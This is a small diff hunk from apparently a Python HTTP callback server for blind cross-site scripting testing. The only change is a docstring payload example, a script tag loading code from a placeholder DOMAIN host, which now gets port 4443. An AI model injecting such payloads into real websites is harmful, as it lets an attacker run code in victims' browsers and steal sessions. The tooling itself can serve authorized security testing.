@@ -27,7 +27,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
       
         """
         We are injecting a payload like: 
-        <script src=//DOMAIN/BxXxSxS></script>
+        <script src=//DOMAIN:4443/BxXxSxS></script>
         with a specific path just in case we get 
         a random client connection.  Either way
         both connections will be logged and a
